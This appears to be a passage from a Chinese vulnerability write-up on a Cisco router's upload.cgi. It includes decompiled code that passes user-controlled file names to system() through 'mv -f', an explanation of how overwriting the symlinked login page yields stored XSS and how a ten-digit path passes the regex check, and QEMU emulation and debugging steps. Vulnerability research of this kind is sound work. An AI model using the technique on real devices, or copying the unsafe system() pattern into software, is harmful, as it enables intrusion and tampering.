(<span class="type">int</span>)sub_1138C;</span><br><span class="line">  v40[<span class="number">2</span>] = (<span class="type">int</span>)sub_11464;</span><br><span class="line">  dword_2348C = <span class="built_in">json_object_new_object</span>(v10);</span><br><span class="line">  v11 = <span class="built_in">StrBufToStr</span>(boundary);</span><br><span class="line">  v12 = <span class="built_in">multipart_parser_init</span>(v11, v40);</span><br><span class="line">  v13 = <span class="built_in">strlen</span>(v8);</span><br><span class="line">  <span class="built_in">multipart_parser_execute</span>(v12, v8, v13);</span><br><span class="line">  <span class="built_in">multipart_parser_free</span>(v12);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v29, <span class="string">&quot;\&quot;file.path\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;haystack, <span class="string">&quot;\&quot;filename\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v30, <span class="string">&quot;\&quot;pathparam\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v31, <span class="string">&quot;\&quot;fileparam\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v32, <span class="string">&quot;\&quot;destination\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v33, <span class="string">&quot;\&quot;option\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v34, <span class="string">&quot;\&quot;cert_name\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v35, <span class="string">&quot;\&quot;cert_type\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v36, <span class="string">&quot;\&quot;password\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( HTTP_COOKIE_addr )</span><br><span class="line">    <span class="built_in">get_strtok_value</span>(HTTP_COOKIE_addr, <span class="string">&quot;sessionid=&quot;</span>, <span class="string">&quot;;&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( !v29 || <span class="built_in">match_regex</span>(<span class="string">&quot;^/tmp/upload/[0-9]&#123;10&#125;$&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content-type: text/html\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Error Input&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">StrBufSetStr</span>(v39, v31);</span><br><span class="line">  v14 = haystack;</span><br><span class="line">  <span class="keyword">if</span> ( haystack )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;.xml&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = <span class="string">&quot;Configuration&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v14, <span class="string">&quot;.img&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">StrBufSetStr</span>(v39, v14);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      &#125;</span><br><span class="line">      v15 = <span class="string">&quot;Firmware&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v30 = v15;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_18:</span><br><span class="line">  v16 = v29;</span><br><span class="line">  v17 = (<span class="type">int</span>)v30;</span><br><span class="line">  v18 = <span class="built_in">StrBufToStr</span>(v39);</span><br><span class="line">  v19 = <span class="built_in">sub_115EC</span>(v17, v16, v18);</span><br><span class="line">  <span class="keyword">if</span> ( v19 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content-type: text/html\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error Input&quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( v19 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">        v26 = <span class="string">&quot;Configure upload fail&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">        v26 = <span class="string">&quot;The length of filename is greater than 128&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">        v26 = <span class="string">&quot;The filename is illegal, only support &#x27;a-z&#x27; &#x27;A-Z&#x27; &#x27;0-9&#x27; &#x27;_&#x27; &#x27;.&#x27; &#x27;-&#x27;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(v26);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(REQUEST_URI_addr, <span class="string">&quot;/api/operations/ciscosb-file:form-file-upload&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = (<span class="type">int</span>)v30;</span><br><span class="line">    v21 = <span class="built_in">StrBufToStr</span>(v39);</span><br><span class="line">    <span class="built_in">sub_125A8</span>(s, v20, v21, v29);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(REQUEST_URI_addr, <span class="string">&quot;/upload&quot;</span>) &amp;&amp; !<span class="built_in">match_regex</span>(<span class="string">&quot;^[A-Fa-f0-9]&#123;64&#125;$&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v22 = v32;</span><br><span class="line">    v23 = v33;</span><br><span class="line">    v24 = (<span class="type">int</span>)v30;</span><br><span class="line">    v25 = <span class="built_in">StrBufToStr</span>(v39);</span><br><span class="line">    <span class="built_in">sub_1277C</span>(s, v22, v23, v24, v25, v34, v35, v36);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_31:</span><br><span class="line">  <span class="built_in">free</span>(v8);</span><br><span class="line">  <span class="built_in">StrBufFree</span>(&amp;v38);</span><br><span class="line">  <span class="built_in">StrBufFree</span>(&amp;boundary);</span><br><span class="line">  <span class="built_in">StrBufFree</span>(&amp;v39);</span><br><span class="line">  <span class="built_in">json_object_put</span>(dword_2348C);</span><br><span class="line">  <span class="built_in">SYSTEM</span>(<span class="string">&quot;rm -f %s/* &gt; /dev/null 2&gt;&amp;1&quot;</span>, <span class="string">&quot;/tmp/upload&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到大部分的信息都是没用的，让我们看漏洞函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_115EC</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">const</span> <span class="type">char</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">316</span>]; <span class="comment">// [sp+Ch] [bp-13Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = a3 == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">    v3 = a1 == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;Firmware&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/firmware/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;Configuration&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/configuration/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;Certificate&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/in_certs/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;Signature&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/signature/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;3g-4g-driver&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/3g-4g-driver/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;Language-pack&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/language-pack/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;User&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/user/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(a1, <span class="string">&quot;Portal&quot;</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/www/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">is_file_exist</span>(a2) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a2) &gt; <span class="number">0x80</span> || <span class="built_in">strlen</span>(a3) &gt; <span class="number">0x80</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">match_regex</span>(<span class="string">&quot;^[a-zA-Z0-9_.-]*$&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-4</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;mv -f %s %s/%s&quot;</span>, a2, v8, a3);</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;cmd=%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( !s[<span class="number">0</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v9 = <span class="built_in">system</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v9 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">error</span>((<span class="type">int</span>)<span class="string">&quot;upload.cgi: %s(%d) Upload failed!&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;prepare_file&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)<span class="number">0xAD</span>);</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会发现到最后会执行mv -f a2 v8&#x2F;a3</p><p>v8是通过判断a1来获得的，a2和a3分别都是参数</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331149.png" alt="image-20240811153815824"></p><p>a2比较显然是通过file.path表单名称来匹配的</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331150.png" alt="image-20240811155117349"></p><p>a3会稍微复杂一点，filename表单的参数如果存在且不包含.img的话，那么a3就是filename表单下的参数，如果filename表单下为空的话，那么fileparam表单下的参数就是a3了，显然第二种方法控制比较简单</p><p>但是呢，如果只是到了这里，那么该漏洞也不会有任何的作用，可是呢</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331151.png" alt="image-20240811180710241"></p><p>在运行的时候会发现<code>/www/login.html</code>其实是软连接到<code>/tmp/www/login.html</code>的，因此只需要覆盖<code>/tmp/www/login.html</code>就能实现对登录页面的篡改，最终达到存储型XSS攻击的效果</p><p>但是还有一个问题</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331152.png" alt="image-20240811223418049"></p><p>此时该判定该如何跳过，接下来的动态调试也会解释这个问题</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>由于<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331153.png" alt="image-20240811212606929"></p><p>这一段过于的抽象，因此可以通过调试来观看整个进程</p><p>我准备采用的是fork子进程的方法，首先仿真成功之后，由于该程序是通过fork子进程然后再通过execvp来执行upload.cgi程序的，因此我们可以通过<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331154.png" alt="image-20240811212043909"></p><p>在程序的开始有个自己跳自己，那么该子进程就会一直在这里执行，同时在调试出错也可以重复进行，可以说是很方便的方法。</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331155.png" alt="image-20240811212337395"></p><p>然后使用gdbserver配合gdb进行调试，看到此时有个子进程，执行gdbserver附加进程</p><p>在主机执行sudo gdb-multiarch，一定要用sudo，因为之后要修改程序的机器码，如果不用root权限的话，因为是rx的所以会无法修改</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331156.png" alt="image-20240811205926274"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331157.png" alt="image-20240811211106460"></p><p>修改完成之后便是可以看到程序正常进行，同时还是从开头执行的</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331158.png" alt="image-20240811211745827"></p><p>由于我们的Post请求是</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331159.png" alt="image-20240811212926160"></p><p>所以这里的函数就是读取表单字段的内容存储在变量里</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331160.png" alt="image-20240811223809098"></p><p>看到上述的执行流走偏的情况，发现他正则匹配的对象是file.path的内容</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331161.png" alt="image-20240811224044862"></p><p>返回值为0，所以绕过了检查，但是这个函数是什么呢，很好奇</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331162.png" alt="image-20240811225228547"></p><p>发现只要是0-9内的10位数都可以绕过检查，也是很不错的</p><p>但是呢 </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">is_file_exist</span>(a2) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-2</span>;</span><br></pre></td></tr></table></figure><p>要求是个存在的文件，因此在fork的时候看一眼</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331163.png" alt="image-20240811225528001"></p><p>所以只能是0000000001了，还是要反复匹配才是正确的</p><h1 id="仿真"><a href="#仿真" class="headerlink" title="仿真"></a>仿真</h1><p>在这里<a href="https://people.debian.org/~aurel32/qemu/armhf/">下载</a>，压缩的linux内核映像，文件系统和内核映像，arm结构要多下一个i开头的文件，涉及到更底层的知识了估计。</p><p>配置网络环境，运行以下脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#sudo ifconfig eth0 down                 # 首先关闭宿主机网卡接口</span></span><br><span class="line">sudo brctl addbr br0                     <span class="comment"># 添加一座名为 br0 的网桥</span></span><br><span class="line">sudo brctl addif br0 ens33                <span class="comment"># 在 br0 中添加一个接口</span></span><br><span class="line">sudo brctl stp br0 off                   <span class="comment"># 如果只有一个网桥，则关闭生成树协议</span></span><br><span class="line">sudo brctl setfd br0 1                   <span class="comment"># 设置 br0 的转发延迟</span></span><br><span class="line">sudo brctl sethello br0 1                <span class="comment"># 设置 br0 的 hello 时间</span></span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     <span class="comment"># 启用 br0 接口</span></span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up    <span class="comment"># 启用网卡接口</span></span><br><span class="line">sudo dhclient br0                        <span class="comment"># 从 dhcp 服务器获得 br0 的 IP 地址</span></span><br><span class="line">sudo brctl show br0                      <span class="comment"># 查看虚拟网桥列表</span></span><br><span class="line">sudo brctl showstp br0                   <span class="comment"># 查看 br0 的各接口信息</span></span><br><span class="line">sudo tunctl -t tap0 -u root              <span class="comment"># 创建一个 tap0 接口，只允许 root 用户访问</span></span><br><span class="line">sudo brctl addif br0 tap0                <span class="comment"># 在虚拟网桥中增加一个 tap0 接口</span></span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    <span class="comment"># 启用 tap0 接口</span></span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure><p>之后运行 </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">  -initrd initrd.img-3.2.0-4-vexpress -drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">  -append <span class="string">&quot;root=/dev/mmcblk0p2&quot;</span> \</span><br><span class="line">  -net nic -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">  -nographic -smp 4 </span><br></pre></td></tr></table></figure><p>该程序，但是我出了一个报错<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331164.png" alt="956b1a9956ce270fe8f2f05939a66989"></p><p>pulseaudio是音频设备，想来你也不需要用qemu机看电影，那么应该是没有什么影响的，把rootfs压缩好scp传上来</p><p>之后在机子里运行老几样建立隔离环境</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> -R 777 rootfs</span><br><span class="line"><span class="built_in">cd</span> rootfs/</span><br><span class="line">mount --<span class="built_in">bind</span> /proc proc</span><br><span class="line">mount --<span class="built_in">bind</span> /dev dev</span><br><span class="line"><span class="built_in">chroot</span> . /bin/sh</span><br></pre></td></tr></table></figure><p>之后执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/boot boot</span><br><span class="line">generate_default_cert</span><br><span class="line">/etc/init.d/confd start</span><br><span class="line">/etc/init.d/nginx start</span><br></pre></td></tr></table></figure><p>怎么来的呢，首先是执行nginx，发现无法访问http页面，就去依次修改报错</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># /etc/init.d/boot boot</span></span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">mount: mounting debugfs on /sys/kernel/debug failed: No such file or directory</span><br><span class="line">Mounting mnt partitions..mount: mounting /dev/mtdblock9 on /mnt/configcert failed: No such device</span><br><span class="line">mount: mounting /dev/mtdblock10 on /mnt/avcsign failed: No such device</span><br><span class="line">mount: mounting /dev/mtdblock11 on /mnt/webrootdb failed: No such device</span><br><span class="line">mount: mounting /dev/mtdblock12 on /mnt/license failed: No such device</span><br><span class="line"><span class="keyword">done</span>.</span><br><span class="line"><span class="built_in">cp</span>: can<span class="string">&#x27;t stat &#x27;</span>/etc/ssl/private/*<span class="string">&#x27;: No such file or directory</span></span><br><span class="line"><span class="string">cp: can&#x27;</span>t <span class="built_in">stat</span> <span class="string">&#x27;/tmp/.KEYS_DIR_TMP/*&#x27;</span>: No such file or directory</span><br><span class="line">uci: Parse error (option/list <span class="built_in">command</span> found before the first section) at line 2492, byte 1</span><br><span class="line"> create_meta_data_xml begin</span><br><span class="line"> meta_data_gen_state: 0</span><br><span class="line"> meta_data_gen_state: 1</span><br><span class="line"> create_meta_data_xml end</span><br><span class="line">/ <span class="comment"># generate_default_cert</span></span><br><span class="line"><span class="built_in">touch</span>: /tmp/stats/certstats.tmp: No such file or directory</span><br><span class="line">/usr/bin/certscript: line 1: can<span class="string">&#x27;t create /tmp/stats/certstats.tmp: nonexistent directory</span></span><br><span class="line"><span class="string">perl: warning: Setting locale failed.</span></span><br><span class="line"><span class="string">perl: warning: Please check that your locale settings:</span></span><br><span class="line"><span class="string">LANGUAGE = (unset),</span></span><br><span class="line"><span class="string">LC_ALL = (unset),</span></span><br><span class="line"><span class="string">LANG = &quot;en_US.UTF-8&quot;</span></span><br><span class="line"><span class="string">    are supported and installed on your system.</span></span><br><span class="line"><span class="string">perl: warning: Falling back to the standard locale (&quot;C&quot;).</span></span><br><span class="line"><span class="string">cp: can&#x27;</span>t <span class="built_in">stat</span> <span class="string">&#x27;/tmp/stats/certstats.tmp&#x27;</span>: No such file or directory</span><br><span class="line">Default</span><br><span class="line">/ <span class="comment"># /etc/init.d/confd start</span></span><br><span class="line"></span><br><span class="line">TRACE Connected (maapi) to ConfD</span><br><span class="line">attaching to init session...</span><br><span class="line">TRACE MAAPI_ATTACH  --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_DELETE /avc-meta-data --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_LOAD_CONFIG_FILE  --&gt; CONFD_OK</span><br><span class="line">TRACE Connected (maapi) to ConfD</span><br><span class="line">attaching to init session...</span><br><span 